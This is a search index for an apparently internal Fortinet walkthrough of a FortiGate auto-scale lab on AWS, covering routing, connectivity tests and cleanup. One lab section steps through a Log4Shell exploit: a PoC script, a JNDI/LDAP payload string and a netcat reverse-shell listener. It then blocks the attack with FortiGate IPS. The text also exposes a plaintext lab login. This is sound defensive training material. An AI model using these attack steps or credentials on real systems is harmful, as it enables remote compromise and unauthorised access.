var relearn_search_index = [
  {
    "content": "In this section we will step through the what is needed before you can get the most out of the rest of the walkthrough demo!\n",
    "description": "",
    "tags": null,
    "title": "1. Pre-requisites",
    "uri": "/prereq.html"
  },
  {
    "content": "Accessing an AWS environment Warning\rThis demo is for Fortinet employees only.\nTo get the credentials, please access the CSE Americas International Sharepoint page.\nYou will find the AWS credentials and login page.\n",
    "description": "",
    "tags": null,
    "title": "1.1 Demo Logistics",
    "uri": "/prereq/21_logistics.html"
  },
  {
    "content": "FortiGate auto-scale on AWS walk-through demo Here you will find information on how to use an environment already provisioned to demo or just to see how FortiGate VM can be configured and used for North-South and East-West inspection on AWS with gateway load balancer.\nIn this environment you will be able to:\nView and change some FortiGate policies Access AWS console with read-only user Access EC2 to test network connectivity and inspection Check how FortiGate, GWLB, TGW and route tables are configured to make it work and other labs available on the left menu This is the topology you will find: Let’s begin!\n",
    "description": "",
    "tags": null,
    "title": "1. Introduction",
    "uri": "/index.html"
  },
  {
    "content": "Before diving into the reference architecture in this demo, let’s review core AWS networking concepts.\nAWS Virtual Private Cloud (VPC) is a logically isolated section of the AWS Cloud where you can launch AWS resources in a virtual network that you define. You have complete control over your virtual networking environment, including selection of your own IP address range, creation of subnets, and configuration of route tables and network gateways.\nAvailability Zones (AZ) are multiple, isolated locations within each Region that have independent power, cooling, physical security, etc. A VPC spans all of the AZs in the Region.\nRegion, is a collection of multiple AZs in a geographic location. The collection of AZs in the same region are all interconnected via redundant, ultra-low-latency networks.\nAll subnets within a VPC are able to reach each other with the default or intrinsic router within the VPC. All resources in a subnet use the intrinsic router (1st host IP in each subnet) as the default gateway. Each subnet must be associated with a VPC route table, which specifies the allowed routes for outbound traffic leaving the subnet.\nAn Internet Gateway (IGW) is a horizontally scaled, redundant, and highly available VPC component that allows communication between instances in your VPC and the internet. It therefore imposes no availability risks or bandwidth constraints on your network traffic.\nAWS Transit Gateway (TGW) is a highly scalable cloud router that connects your VPCs in the same region to each other, to on-premise networks, and even to the internet through one hub. With the use of multiple route tables for a single TGW, you can design hub and spoke routing for traffic inspection and enforcement of security policy across multiple VPCs.\nAWS (Gateway Load Balancer (GWLB) is a transparent network gateway that distributes traffic (in a 3/5 tuple flow aware manner) to a fleet of virtual appliances for inspection. This is a regional load balancer that uses GWLB endpoints (GWLBe) to securely intercept data plane traffic within consumer VPCs in the same region.\nIn this demo you will use all these components to test FortiGate VM in an enterprise design.\nFor a deep dive on AWS networking concepts in your own lab, outside of this event, you can follow the AWS Network Immersion Day workshop in your own AWS account at your leisure.\nCheck this example to understand the packet walk in a GWLB deployment Packet walk\nEC2 will check the route table for the more specific route. In this case 10.1.2.0/24 pointing to GWLBe-A Traffic arrives at GWBLe-A. Every time the traffic arrives at a GWLB endpoint it sends to the GWLB Traffic at GWLB will be forwarded to one member of the target group In this case we have only one FortiGate, so traffic arrives at FortiGate. It inspects the traffic and if allowed, send it back to GWLB GWLB sends the reply to GWLBe-A which originated the connection When traffic returns to GWLBe it checks its route table. For 10.1.0.0/24 it is “local”. So it sends directly. Traffic arrives at the final destination This concludes this section.\n",
    "description": "",
    "tags": null,
    "title": "1.2 AWS Networking Concepts",
    "uri": "/prereq/22_awsnetworkingconcepts.html"
  },
  {
    "content": "Remembering AWS diagram: In this demo, all these components are already setup.\nWe have:\nFortiGate VM in two auto-scale groups: ASG FFlex (fgt_byol_asg: using FortiFlex licenses) and ASG PAYG (fgt_on_demand_asg: using PAYG FortiGate VMs) Routing is configured for 2 AZs (availability zones) but we will use only us-east-1a There are EC2 instances in every subnet that you will use The VPC Pub-testing-vpc is not connected with the other VPCs. You will use the EC2 hosted there to run attacks. It simulates an attack coming from internet ",
    "description": "",
    "tags": null,
    "title": "2. Hands-on",
    "uri": "/demohandson.html"
  },
  {
    "content": "Every night (GMT-3 timezone) the EC2 instances are shutdown to save money and the FortiGate ASGs are set to zero, so if you enter in the AWS account is probably that there is somebody else using it, because I doubt somebody used the environment and forgot to shutdown, right? :D\nSo, the first thing you will need to do, after logged into AWS account, is:\nBring FortiGate VM up Make sure you are in N. Virginia region Type EC2 in search box and click on it Scroll down to “Auto Scaling Groups” menu. Click on it and select the “fgt_byol_asg”\nClick “Edit” Set “Desired Capacity” at 1 and click “Update” With this only one FortiGate instance will be created. This is enough for the demo, in the real environment, it is recommended to have one per AZ used.\nGo to “Instances” menu. You will see a FortiGate instance running (wait 3-5 minutes before accessing it). In this process the FortiGate is being licensed using FortiFlex\nIn the same page, start the other instances. To do so, check all of them, click “Instance state” button and click on “Start instance”\n9. Now you are good to start the tasks\n",
    "description": "",
    "tags": null,
    "title": "Start the resources",
    "uri": "/demohandson/31_starttheresources.html"
  },
  {
    "content": "These tasks were thinking of to demo some features of using FortiGate with gateway load balancer, but you can think in other tests.\nFeel free to explore the AWS routing tables, check TGW configuration, etc. If you have suggestions for other labs, that are not here or you don’t have permission to do it, please write a comment in the same Sharepoint page you got the credentials.\nThere is no specific order to perform the tasks.\n",
    "description": "",
    "tags": null,
    "title": "3. Tasks",
    "uri": "/tasks.html"
  },
  {
    "content": "When using FortiGate with GWLB you can save money and not using NAT Gateways. NAT GW’s are charge for hour and usage, with the scenario you have here, the FortiGate can be your NAT Gateway for all the VPCs connected.\nNAT Gateways are used by private instances, what I mean is, the instances that don’t have public IPs. Instances that have public IP use IGW (Internet Gateway) to go to internet.\nIn this first lab, we will see an instance with public IP going to internet using FortiGate public IP and other instance going with its own IP, but with the traffic being inspected by FortiGate.\nIn AWS console, go to EC2 menu and click on “Instances”\nClick “wk-spk1-pub-a” and then click “Connect” Click “EC2 serial console” and then “Connect” The login information is:\nuser: student password: F0rt1n3t\nLeave this console tab opened. Repeat the same process with the instance “wk-spk2-pub-a”\nIn both consoles run the command:\ncurl icanhazip.com\nThis command let us know with which public IP this instance is accessing internet. You will see that the IP is different between wk-spk2-pub-a and wk-spk1-pub-a. This is happening because one instance (wk-spk2-pub-a) is going to the internet using its own public IP and the other instance is using FortiGate’s IP.\nLeave these console tabs opened\nGo back to AWS console and check the public IPs:\nCheck the FortiGate. To see the FortiGate public IP, select the FortiGate, then click “Networking” tab and scroll down: Copy this IP and in a new browser tab, paste it to access FortiGate GUI. FortiGate credentials are in Sharepoint page After you logged into FortiGate, check the “Policy Routes”. You will see we have a policy route for all “spoke2-sub-pub1-a” subnet, that is the subnet from wk-spk2-pub-a You can run a sniffer to see the traffic from both instances (wk-spk2-pub-a and wk-spk1-pub-a) being inspect by FortiGate. Open the FortiGate CLI Console and paste the command below: diag sniffer packet any 'host 8.8.8.8' 4\nLeave it running and go to the console tab of one EC2 instance. Then type: ping 8.8.8.8\nGo back to FortiGate and see it in the console Go back to the same EC2 instance console and stop the ping command. Repeat the ping command in the other EC2 instance console. You will see FortiGate is inspecting it as well. You are free to change FortiGate firewall policy to perform some different tests Warning\rIf you change FortiGate firewall policy, remember to leave it as it was when you accessed or your next labs may not work\nThis is FortiGate security policy default: ",
    "description": "",
    "tags": null,
    "title": "3.1 Connectivity: North-South",
    "uri": "/tasks/41_connectivityns.html"
  },
  {
    "content": "With the same FortiGate cluster, you can inspect the traffic between VPCs and subnets inside the same VPC.\nIn this task you will test both scenarios.\nTraffic inspection between VPCs In AWS console, go to EC2 menu and click on “Instances”\nClick “wk-spk1-pub-a” and then click “Connect” Click “EC2 serial console” and then “Connect” The login information is: user: student password: F0rt1n3t\nLeave this console tab opened. Repeat the same process with the instance “wk-spk2-pub-a”\nUsing the console, ping one instance from another. Example: go to “wk-spk2-pub-a” console and ping “wk-spk1-pub-a” internal IP\nTo see the internal IP from an EC2, go to AWS console \u003e EC2 \u003e Instances and select the instance. You will see the IP in the panel below\nLeave ping running and connect to FortiGate VM Check the FortiGate. To see the FortiGate public IP, select the FortiGate, then click “Networking” tab and scroll down: Copy this IP and in a new browser tab, paste it to access FortiGate GUI. FortiGate credentials are in Sharepoint page After you logged into FortiGate, go to “Policy \u0026 Objects” \u003e “Firewall Policy”. You will see a rule allowing all the traffic from “geneve-tunnels” to “geneve-tunnels”. It means, all traffic flowing through the tunnels created when GWLB was deployed is allowed. Now, change the status of this rule to disable. You will see the ping in “wk-spk2-pub-a” console will stop working. You can always check if the traffic is coming to FortiGate using CLI and the command below (replace X.X.X.X with the IP you want to monitor): diag sniffer packet any 'host X.X.X.X' 4\nRe-enable the firewall policy Traffic inspection between subnets In previous task you saw that FortiGate is inspecting the traffic between VPCs, but in some cases you want to inspect or restrict the traffic between subnets in the same VPC. For example: a subnet contains data information (eg. database) and the other subnet the application. You want the application subnet access the data, but not the other way around.\nTo make it works, you will need to redirect the traffic to be inspected by FortiGate. To do so, you must use the route tables, where you point the destination as the subnet and the target as the GWLB Endpoint, that will forward the traffic to GWLB, then GWLB will forward the traffic to one FortiGate, where the traffic will be inspected and if it’s allowed, it will return to the same path.\nIn this demo, we configured spoke2-vpc to have inter-vpc traffic inspected. Let’s see how it was configured.\nIn AWS console, go to VPC (use the search bar) Go to Subnets menu and select “spoke2-sub-pub1-a”. This is the subnet where “wk-spk2-pub-a” is hosted. Click “Route table”. It will load the route table for this subnet. You can see the destination CIDR’s and the Target. Note there is a destination as 10.30.128.0/20 that is the CIDR from “spoke2-sub-pri1-a” pointing to vpce-xxxxxxx, this is the GWLB Endpoint. So when this subnet access the “spoke2-sub-pri1-a” the traffic will be inspected by FortiGate. Now, go to EC2 menu and click on “Instances” Click “wk-spk2-pri-a” and copy its private IP Click “wk-spk2-pub-a\"and then click “Connect” Click “EC2 serial console” and then “Connect” The login information is: user: student password: F0rt1n3t\nPing the IP copied from step 5 Check the FortiGate. To see the FortiGate public IP, select the FortiGate, then click “Networking” tab and scroll down:\nCopy this IP and in a new browser tab, paste it to access FortiGate GUI. FortiGate credentials are in Sharepoint page After you logged into FortiGate, go to “Policy \u0026 Objects” \u003e “Firewall Policy”. You will see a rule allowing all the traffic from “geneve-tunnels” to “geneve-tunnels”. It means, all traffic flowing through the tunnels created when GWLB was deployed is allowed. Now, change the status of this rule to disable. You will see the ping in “wk-spk2-pub-a” console will stop working. You can always check if the traffic is coming to FortiGate using CLI and the command below (replace X.X.X.X with the IP you want to monitor): diag sniffer packet any 'host X.X.X.X' 4\nYou can create and modify FortiGate firewall rules, so try to block ping, or some service, etc. This was only to demo the traffic being inspected and to make it simple, we enabled/disabled rules, but you can implement more sophisticated rules with this same principle. Re-enable the firewall policy and return FortiGate rules to original state ",
    "description": "",
    "tags": null,
    "title": "3.2 Connectivity: East-West",
    "uri": "/tasks/42_connectivityew.html"
  },
  {
    "content": "Log4Shell is a zero-day vulnerability with a CVSS severity rating of 10 and it was largely explored few years ago… and continues to these days. In this lab you will perform some attacks and block it using FGT.\nThe first thing we need to do is to start a Docker container with the vulnerable application\nIn AWS console, go to EC2 menu and click on “Instances”\nClick “wk-spk1-pub-a” and then click “Connect” Click “EC2 serial console” and then “Connect” The login information is:\nuser: student password: F0rt1n3t\nInside the console, run the following command: docker run --network host -t -i log4j-shell-poc\n7. Copy its PublicIPs. The application URL (Log4ShellAPPURL) will be http://PublicIPs:8080. In this example: http://54.221.177.198:8080 8. Access Pub-EC2 using Microsoft Remote Desktop Connection (or equivalent) with the public IP shown on: AWS Console \u003e EC2 \u003e Instances \u003e Click Pub-EC2 \u003e Public IPv4 address\nTo login, use the credentials below: user: student password: F0rt1n3t\nWarning\rIf shown another screen with “Authentication Required” and Ubuntu user, just click “Cancel”\nClick the 9-dots square to open Firefox (if you dont see the dots, click on “Activities”) Use Firefox address bar to access the Log4ShellAPPURL\nYou should have accessed the application. Keep this Firefox window open. The application can be slightly different from the image below\nClick “activities” menu at upper left \u003e 9-dots square \u003e Terminal\n14. Inside terminal window type:\ncd log4j-shell-poc python3 poc.py \\--userip \\\u003cPUBLIC_IP\\\u003e \\--webport 8000 \\--lport 9001\nPUBLIC_IP is the public IP you used to connect to Remote Desktop. You can see it in the “title bar” from remote desktop app, example in the screenshots 52.91.129.42\nPress enter\nYou should see a string starting with ${jndi://ldap……. Copy it Open a new tab in the terminal window and type:\nnc -lvnp 9001\nPress enter. It starts the netcat\nLeave the terminal window opened\nGo to the Firefox browser and paste the string copied from step 16 in the Username field\nIn the password you can type anything, example: password\nClick Login\nIn the terminal window (with netcat running) you should see a message “Connection received on …”\nThis means you got remote shell!\nThis terminal window (with netcat running) is now the shell from the pod running the application. You can do whatever you want, as you are… if you type whoami and press enter in the terminal you’ll know…\nNow you are inside, as an attacker, you could perform a lot of attacks, data exfiltration, lateral movement and many other dangerous activities\nWarning\rNote: You used a EC2 in other VPC, the access from this EC2 don’t go through FortiGate and you also used the external (public) IP, so it could be done from any other machine in the internet\nPress CTRL+C to stop netcat You will block this attack with FortiGate. To do so, you will enable the IPS profile Go to FortiGate GUI To access FortiGate, open AWS Console \u003e EC2 \u003e Instances \u003e click on FortiGate instance (fgt_byol_asg). To see the FortiGate public IP, select the FortiGate, then click “Networking” tab and scroll down: Copy this IP and in a new browser tab, paste it to access FortiGate GUI.\nFortiGate credentials are in Sharepoint page\nChange the firewall policy named Rule for Log4J testing to be exactly as shown below: Now, try to perform the same attack again. If you don’t remember, go back 14\nDifferent from earlier, now you should not see any connection in your netcat terminal. Go check FortiGate logs Inside Logs \u0026 Report \u003e Security Events \u003e Intrusion Prevention you will find the log entry blocking Log4Shell.\nLab complete!\n",
    "description": "",
    "tags": null,
    "title": "3.3 IPS: Log4Shell attack",
    "uri": "/tasks/43_log4shellattack.html"
  },
  {
    "content": "I hope this walkthrough demo helped you in someway.\nWe are all responsible for saving money for the company, so please, before you go stop all the EC2 and set FortiGate ASG to 0.\nStopping EC2 Open AWS Console Go to EC2 \u003e Instances Check all the Instances and in “instance state” click “Stop instance” FortiGate ASG to 0 If you only stop the FortiGate instance the auto scaling group will start a new instance, so you need to change it as well In EC2 \u003e scroll down to “Auto Scaling Groups” menu Select “fgt_byol_asg” and click “Edit” Set “Desired capacity” to 0 and click “Update” Now you are good to go! CSE Americas International Team thanks you for your time!\n",
    "description": "",
    "tags": null,
    "title": "4. Clean up",
    "uri": "/cleanup.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Categories",
    "uri": "/categories.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tags",
    "uri": "/tags.html"
  }
]
